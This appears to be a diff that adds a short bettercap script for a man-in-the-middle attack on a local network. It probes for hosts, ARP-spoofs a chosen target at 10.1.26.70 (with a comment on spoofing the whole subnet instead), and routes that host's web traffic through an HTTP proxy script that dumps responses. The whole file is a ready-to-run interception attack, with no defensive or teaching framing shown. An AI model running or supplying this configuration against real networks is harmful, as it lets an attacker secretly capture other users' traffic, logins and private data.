@@ -1,0 +1,15 @@
+# Discover hosts
+net.probe on
+sleep 1
+net.probe off
+
+# Target (comment out to arp spoof entire subnet)
+set arp.spoof.targets 10.1.26.70
+set arp.spoof.internal true
+
+# Proxy script we'll use
+set http.proxy.script http-resp-dump.js
+
+# leggo
+http.proxy on
+arp.spoof on
